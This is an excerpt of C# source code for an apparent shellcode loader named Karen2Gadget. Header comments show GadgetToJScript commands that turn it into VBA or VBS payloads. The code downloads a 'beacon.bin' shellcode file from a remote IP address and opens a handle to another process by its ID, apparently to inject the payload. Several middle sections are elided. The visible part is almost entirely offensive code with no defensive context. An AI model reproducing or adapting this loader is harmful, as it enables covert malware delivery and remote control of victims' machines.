...
// GadgetToJScript.exe -c C:\Users\Wesley\source\repos\Karen2Gadget\Karen2Gadget\Program.cs -o C:\Users\Wesley\Desktop\Karen2Gadget -w vba -b -d System.dll
// GadgetToJScript.exe -c C:\Users\Wesley\source\repos\Karen2Gadget\Karen2Gadget\Program.cs -o C:\Users\Wesley\Desktop\Karen2Gadget -w vbs -b -d System.dll

namespace Karen2Gadget
{
    public class Program
    {
        ...
        public Program()
        {
            ...
            using (WebClient client = new WebClient())
            {
                try
                {
                    shellcode = client.DownloadData("https://192.168.231.128:443/beacon.bin");
                }
                catch
                {
                    Environment.Exit(0);
            ...
            try
            {
                phandle = Process.GetProcessById(1964).Handle;
            }
            catch (Exception)
            {
                Environment.Exit(0);
